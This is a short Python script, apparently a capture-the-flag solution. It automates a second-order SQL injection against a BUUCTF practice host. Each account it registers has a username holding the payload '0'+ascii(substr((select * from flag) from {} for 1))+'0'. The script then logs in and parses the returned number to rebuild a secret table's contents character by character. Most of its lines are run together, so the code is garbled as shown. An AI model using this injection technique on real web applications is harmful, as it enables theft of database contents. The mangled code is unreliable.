```
url =' http://e216dce0-dd95-4585-90a3-b0d9f3963582.node3.buuoj.cn/'
flag =''
url_login = url + 'login.php'url_register = url + 'register.php'url_index = url +'index.php'
for i in range(100):  sleep(0.2)  data_reg = {"email":"8888{}@qq.com".format(i),"username":"0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i), "password" : "123"}  data_log = {"email" : "8888{}@qq.com".format(i), "password" : "123"} 
  r1=requests.post(url_register,data=data_reg)  r2=requests.post(url_login,data=data_log)  #r3=requests.get(url_index)    res = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r2.text)  res1 = re.search(r'\d+', res.group())  flag = flag+chr(int(res1.group()))  print(flag)

```
